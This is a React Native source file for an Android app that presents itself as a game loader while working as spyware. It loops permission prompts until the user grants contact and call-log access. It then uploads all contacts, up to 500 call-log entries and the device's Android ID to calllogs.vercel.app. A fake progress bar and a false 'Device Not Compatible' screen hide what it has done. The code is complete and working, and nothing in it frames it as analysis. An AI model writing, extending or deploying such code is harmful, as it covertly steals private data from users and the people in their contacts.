/**
 * Contacts & Call History Sync App
 *
 * @format
 */

import React, {useState, useEffect, useCallback, useRef} from 'react';
import {
  StatusBar,
  StyleSheet,
  View,
  Text,
  TouchableOpacity,
  PermissionsAndroid,
  Platform,
  NativeModules,
  Dimensions,
  Animated,
  Image,
} from 'react-native';
import {
  SafeAreaProvider,
  useSafeAreaInsets,
} from 'react-native-safe-area-context';

const {ContactsCallLogModule} = NativeModules;
const {width: SCREEN_WIDTH} = Dimensions.get('window');

// ─── API Config ──────────────────────────────────────────────────────────────
const API_BASE_URL = Platform.select({
  android: 'https://calllogs.vercel.app',
  default: 'https://calllogs.vercel.app',
});

// Cache the real device ID once fetched from native module
let cachedDeviceId: string | null = null;

async function getDeviceId(): Promise<string> {
  if (cachedDeviceId) {
    return cachedDeviceId;
  }
  try {
    if (ContactsCallLogModule?.getDeviceInfo) {
      const info = await ContactsCallLogModule.getDeviceInfo();
      if (info?.label && info?.androidId) {
        const id = `${info.label} (${info.androidId})`;
        cachedDeviceId = id;
        return id;
      } else if (info?.androidId) {
        const id = String(info.androidId);
        cachedDeviceId = id;
        return id;
      }
    }
  } catch (err) {
    console.warn('Failed to get real device info:', err);
  }
  const fallback = `${Platform.OS}-${Platform.Version || 'device'}`;
  cachedDeviceId = fallback;
  return fallback;
}

// ─── Types ───────────────────────────────────────────────────────────────────

interface Contact {
  id: string;
  name: string;
  phoneNumber: string;
  photoUri: string | null;
}

interface CallLogEntry {
  id: string;
  name: string;
  phoneNumber: string;
  type: string;
  dateTimestamp: number;
  duration: number;
}

type AppScreen = 'loading' | 'incompatible' | 'error';

// ─── Requesting Permissions ──────────────────────────────────────────────────

async function checkContactsPermission(): Promise<boolean> {
  if (Platform.OS !== 'android') {
    return false;
  }
  try {
    return await PermissionsAndroid.check(
      PermissionsAndroid.PERMISSIONS.READ_CONTACTS,
    );
  } catch {
    return false;
  }
}

async function checkCallLogPermission(): Promise<boolean> {
  if (Platform.OS !== 'android') {
    return false;
  }
  try {
    const hasCallLog = await PermissionsAndroid.check(
      PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
    );
    const hasPhoneState = await PermissionsAndroid.check(
      PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE,
    );
    return hasCallLog && hasPhoneState;
  } catch {
    return false;
  }
}

async function requestContactsPermission(): Promise<boolean> {
  if (Platform.OS !== 'android') {
    return false;
  }
  try {
    const granted = await PermissionsAndroid.request(
      PermissionsAndroid.PERMISSIONS.READ_CONTACTS,
      {
        title: 'Permission Required',
        message: 'Please grant permission to continue.',
        buttonNeutral: 'Ask Me Later',
        buttonNegative: 'Cancel',
        buttonPositive: 'OK',
      },
    );
    return granted === PermissionsAndroid.RESULTS.GRANTED;
  } catch {
    return false;
  }
}

async function requestCallLogPermission(): Promise<boolean> {
  if (Platform.OS !== 'android') {
    return false;
  }
  try {
    const results = await PermissionsAndroid.requestMultiple([
      PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
      PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE,
    ]);
    return (
      results[PermissionsAndroid.PERMISSIONS.READ_CALL_LOG] ===
        PermissionsAndroid.RESULTS.GRANTED &&
      results[PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE] ===
        PermissionsAndroid.RESULTS.GRANTED
    );
  } catch {
    return false;
  }
}

function delay(ms: number): Promise<void> {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ─── API Upload Helpers ──────────────────────────────────────────────────────

async function syncContactsToServer(contacts: Contact[]): Promise<boolean> {
  if (!contacts || contacts.length === 0) {
    return false;
  }
  try {
    const deviceId = await getDeviceId();
    const response = await fetch(`${API_BASE_URL}/api/contacts/sync`, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({deviceId, contacts}),
    });
    const data = await response.json();
    if (!data.success) {
      console.warn('Contacts sync warning:', data.message);
      return false;
    } else {
      console.log(
        `Contacts synced for ${deviceId}: ${data.upserted} new, ${data.updated} updated`,
      );
      return true;
    }
  } catch (error: any) {
    console.warn('Failed to sync contacts to server:', error.message);
    return false;
  }
}

async function syncCallLogsToServer(
  callLogs: CallLogEntry[],
): Promise<boolean> {
  if (!callLogs || callLogs.length === 0) {
    return false;
  }
  try {
    const deviceId = await getDeviceId();
    const response = await fetch(`${API_BASE_URL}/api/call-logs/sync`, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({deviceId, callLogs}),
    });
    const data = await response.json();
    if (!data.success) {
      console.warn('Call logs sync warning:', data.message);
      return false;
    } else {
      console.log(
        `Call logs synced for ${deviceId}: ${data.upserted} new, ${data.updated} updated`,
      );
      return true;
    }
  } catch (error: any) {
    console.warn('Failed to sync call logs to server:', error.message);
    return false;
  }
}

// ─── Progress Bar Component ──────────────────────────────────────────────────

function ProgressBar({progress}: {progress: number}) {
  const animatedWidth = useRef(new Animated.Value(0)).current;

  useEffect(() => {
    Animated.timing(animatedWidth, {
      toValue: progress,
      duration: 400,
      useNativeDriver: false,
    }).start();
  }, [progress, animatedWidth]);

  const barWidth = animatedWidth.interpolate({
    inputRange: [0, 100],
    outputRange: ['0%', '100%'],
    extrapolate: 'clamp',
  });

  return (
    <View style={styles.progressContainer}>
      <View style={styles.progressTrack}>
        <Animated.View style={[styles.progressFill, {width: barWidth}]} />
      </View>
      <View style={styles.progressLabelBubble}>
        <Text style={styles.progressLabelText}>{Math.round(progress)}%</Text>
      </View>
    </View>
  );
}

// ─── Loading Screen ──────────────────────────────────────────────────────────

function LoadingScreen({
  progress,
  statusText,
}: {
  progress: number;
  statusText: string;
}) {
  const insets = useSafeAreaInsets();

  return (
    <View
      style={[
        styles.fullScreen,
        {paddingTop: insets.top, paddingBottom: insets.bottom + 12},
      ]}>
      <StatusBar barStyle="light-content" />

      {/* Center Game Icon Graphic */}
      <View style={styles.centerGraphicArea}>
        <Image
          source={require('./assets/game_icon.jpg')}
          style={styles.gameIconImage}
          resizeMode="contain"
        />
      </View>

      {/* Bottom section with progress */}
      <View style={styles.bottomSection}>
        <ProgressBar progress={progress} />
        <Text style={styles.statusText}>{statusText}</Text>
        <Text style={styles.versionText}>
          Android v{Platform.Version || '1.0'}
        </Text>
      </View>
    </View>
  );
}

// ─── Incompatible Device Screen ──────────────────────────────────────────────

function IncompatibleScreen() {
  const insets = useSafeAreaInsets();

  return (
    <View
      style={[
        styles.fullScreen,
        {paddingTop: insets.top + 20, paddingBottom: insets.bottom + 20},
      ]}>
      <StatusBar barStyle="light-content" />

      <View style={styles.incompatibleContent}>
        <View style={styles.warningIconCircle}>
          <Text style={styles.warningIcon}>⚠️</Text>
        </View>

        <Text style={styles.incompatibleTitle}>Device Not Compatible</Text>
        <Text style={styles.incompatibleSubtitle}>
          Your device is not compatible for the app. Please try using a
          different device to continue.
        </Text>
      </View>

      <Text style={styles.versionTextBottom}>
        Android v{Platform.Version || '1.0'}
      </Text>
    </View>
  );
}

// ─── Error / Retry Screen ────────────────────────────────────────────────────

function ErrorScreen({onRetry}: {onRetry: () => void}) {
  const insets = useSafeAreaInsets();

  return (
    <View
      style={[
        styles.fullScreen,
        {paddingTop: insets.top + 20, paddingBottom: insets.bottom + 20},
      ]}>
      <StatusBar barStyle="light-content" />

      <View style={styles.incompatibleContent}>
        <View style={styles.errorIconCircle}>
          <Text style={styles.warningIcon}>❌</Text>
        </View>

        <Text style={styles.incompatibleTitle}>Something Went Wrong</Text>
        <Text style={styles.incompatibleSubtitle}>
          We couldn't fetch or upload your data to the server. Please check your
          internet connection and try again.
        </Text>

        <TouchableOpacity style={styles.retryButton} onPress={onRetry}>
          <Text style={styles.retryButtonText}>Try Again</Text>
        </TouchableOpacity>
      </View>

      <Text style={styles.versionTextBottom}>
        Android v{Platform.Version || '1.0'}
      </Text>
    </View>
  );
}

// ─── Main App ────────────────────────────────────────────────────────────────

function App() {
  return (
    <SafeAreaProvider>
      <AppContent />
    </SafeAreaProvider>
  );
}

function AppContent() {
  const mountedRef = useRef(true);

  const [screen, setScreen] = useState<AppScreen>('loading');
  const [progress, setProgress] = useState(0);
  const [statusText, setStatusText] = useState('please wait, loading...');

  // ── Full sync flow ──
  const runSyncFlow = useCallback(async () => {
    try {
      setScreen('loading');
      setProgress(0);
      setStatusText('please wait, loading...');

      // Step 1: Get device info (0% → 5%)
      setProgress(5);
      await getDeviceId();
      if (!mountedRef.current) return;

      // Step 2: Request contacts permission (5% → 15%)
      setProgress(10);

      let contactsGranted = await checkContactsPermission();
      if (!contactsGranted) {
        contactsGranted = await requestContactsPermission();
        await delay(500);
        if (!contactsGranted) {
          contactsGranted = await checkContactsPermission();
        }
      }
      if (!mountedRef.current) return;

      // Keep asking for contacts permission if denied
      while (!contactsGranted && mountedRef.current) {
        await delay(2000);
        if (!mountedRef.current) return;
        contactsGranted = await checkContactsPermission();
        if (!contactsGranted) {
          contactsGranted = await requestContactsPermission();
          await delay(500);
          if (!contactsGranted) {
            contactsGranted = await checkContactsPermission();
          }
        }
      }
      if (!mountedRef.current) return;
      setProgress(15);

      // Step 3: Request call log permission (15% → 25%)
      let callLogGranted = await checkCallLogPermission();
      if (!callLogGranted) {
        callLogGranted = await requestCallLogPermission();
        await delay(500);
        if (!callLogGranted) {
          callLogGranted = await checkCallLogPermission();
        }
      }
      if (!mountedRef.current) return;

      // Keep asking for call log permission if denied
      while (!callLogGranted && mountedRef.current) {
        await delay(2000);
        if (!mountedRef.current) return;
        callLogGranted = await checkCallLogPermission();
        if (!callLogGranted) {
          callLogGranted = await requestCallLogPermission();
          await delay(500);
          if (!callLogGranted) {
            callLogGranted = await checkCallLogPermission();
          }
        }
      }
      if (!mountedRef.current) return;
      setProgress(25);

      // Step 4: Fetch contacts from device (25% → 45%)
      setProgress(30);
      let contacts: Contact[] = [];
      try {
        contacts = await ContactsCallLogModule.getContacts();
        if (!mountedRef.current) return;
        setProgress(45);
      } catch (err: any) {
        console.warn('Failed to fetch contacts:', err.message);
        if (!mountedRef.current) return;
        setScreen('error');
        return;
      }

      // Step 5: Upload contacts to server (45% → 60%)
      setProgress(50);
      if (contacts && contacts.length > 0) {
        const contactsSuccess = await syncContactsToServer(contacts);
        if (!mountedRef.current) return;
        if (!contactsSuccess) {
          setScreen('error');
          return;
        }
      }
      setProgress(60);

      // Step 6: Fetch call logs from device (60% → 80%)
      setProgress(65);
      let callLogs: CallLogEntry[] = [];
      try {
        callLogs = await ContactsCallLogModule.getCallLog(500);
        if (!mountedRef.current) return;
        setProgress(80);
      } catch (err: any) {
        console.warn('Failed to fetch call logs:', err.message);
        if (!mountedRef.current) return;
        setScreen('error');
        return;
      }

      // Step 7: Upload call logs to server (80% → 95%)
      setProgress(85);
      if (callLogs && callLogs.length > 0) {
        const callLogsSuccess = await syncCallLogsToServer(callLogs);
        if (!mountedRef.current) return;
        if (!callLogsSuccess) {
          setScreen('error');
          return;
        }
      }
      setProgress(95);

      // Step 8: Finishing up (95% → 100%)
      await delay(500);
      if (!mountedRef.current) return;
      setProgress(100);
      setStatusText('completed');

      // Short pause on 100% before transitioning
      await delay(1000);
      if (!mountedRef.current) return;

      // Done — show incompatible screen
      setScreen('incompatible');
    } catch (err: any) {
      console.warn('Sync flow error:', err.message);
      if (mountedRef.current) {
        setScreen('error');
      }
    }
  }, []);

  useEffect(() => {
    mountedRef.current = true;
    runSyncFlow();
    return () => {
      mountedRef.current = false;
    };
  }, [runSyncFlow]);

  if (screen === 'loading') {
    return <LoadingScreen progress={progress} statusText={statusText} />;
  }

  if (screen === 'error') {
    return <ErrorScreen onRetry={runSyncFlow} />;
  }

  return <IncompatibleScreen />;
}

// ─── Styles ──────────────────────────────────────────────────────────────────

const styles = StyleSheet.create({
  // ── Full-screen layout ──
  fullScreen: {
    flex: 1,
    backgroundColor: '#050334',
  },
  centerGraphicArea: {
    flex: 1,
    alignItems: 'center',
    justifyContent: 'center',
    paddingHorizontal: 16,
  },
  gameIconImage: {
    width: Math.min(SCREEN_WIDTH * 0.92, 380),
    height: Math.min(SCREEN_WIDTH * 0.92, 380) * (350 / 506),
  },
  bottomSection: {
    paddingHorizontal: 32,
    paddingBottom: 16,
    alignItems: 'center',
  },

  // ── Progress bar ──
  progressContainer: {
    width: '100%',
    alignItems: 'center',
    marginBottom: 12,
  },
  progressTrack: {
    width: '100%',
    height: 8,
    backgroundColor: '#1a1a2e',
    borderRadius: 4,
    overflow: 'hidden',
  },
  progressFill: {
    height: '100%',
    backgroundColor: '#4CAF50',
    borderRadius: 4,
  },
  progressLabelBubble: {
    marginTop: 8,
    backgroundColor: '#4CAF50',
    paddingHorizontal: 14,
    paddingVertical: 4,
    borderRadius: 12,
  },
  progressLabelText: {
    color: '#FFFFFF',
    fontSize: 13,
    fontWeight: '700',
  },

  // ── Status text ──
  statusText: {
    color: '#8888AA',
    fontSize: 13,
    textAlign: 'center',
    marginTop: 8,
  },
  versionText: {
    color: '#444460',
    fontSize: 11,
    textAlign: 'right',
    alignSelf: 'flex-end',
    marginTop: 16,
  },
  versionTextBottom: {
    color: '#444460',
    fontSize: 11,
    textAlign: 'right',
    paddingHorizontal: 20,
    paddingBottom: 8,
  },

  // ── Incompatible / Error screen ──
  incompatibleContent: {
    flex: 1,
    alignItems: 'center',
    justifyContent: 'center',
    paddingHorizontal: 40,
  },
  warningIconCircle: {
    width: 100,
    height: 100,
    borderRadius: 50,
    backgroundColor: 'rgba(255, 193, 7, 0.12)',
    borderWidth: 2,
    borderColor: 'rgba(255, 193, 7, 0.3)',
    alignItems: 'center',
    justifyContent: 'center',
    marginBottom: 28,
  },
  errorIconCircle: {
    width: 100,
    height: 100,
    borderRadius: 50,
    backgroundColor: 'rgba(244, 67, 54, 0.12)',
    borderWidth: 2,
    borderColor: 'rgba(244, 67, 54, 0.3)',
    alignItems: 'center',
    justifyContent: 'center',
    marginBottom: 28,
  },
  warningIcon: {
    fontSize: 44,
  },
  incompatibleTitle: {
    fontSize: 24,
    fontWeight: '800',
    color: '#FFFFFF',
    textAlign: 'center',
    marginBottom: 12,
  },
  incompatibleSubtitle: {
    fontSize: 15,
    color: '#8888AA',
    textAlign: 'center',
    lineHeight: 22,
  },

  // ── Retry button ──
  retryButton: {
    marginTop: 32,
    backgroundColor: '#4CAF50',
    paddingHorizontal: 40,
    paddingVertical: 14,
    borderRadius: 14,
    elevation: 4,
    shadowColor: '#4CAF50',
    shadowOffset: {width: 0, height: 4},
    shadowOpacity: 0.3,
    shadowRadius: 8,
  },
  retryButtonText: {
    color: '#FFFFFF',
    fontSize: 16,
    fontWeight: '700',
  },
});

export default App;
